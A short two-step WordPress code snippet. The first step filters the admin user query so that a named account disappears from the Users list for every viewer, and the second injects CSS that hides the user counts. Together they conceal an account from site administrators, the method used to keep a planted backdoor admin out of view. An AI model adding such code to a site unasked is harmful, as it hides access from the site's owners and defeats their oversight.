Step: 1
*******

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'username' || $username == 'username') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'username'",$user_search->query_where);
  }
}



Step: 2
*******

add_action('admin_head', 'my_custom_css');
function my_custom_css() {
  echo '<style>
  .wp-admin.users-php span.count {
  display: none;
  opacity: 0;
  visibility: hidden;
  }
  </style>';
  }
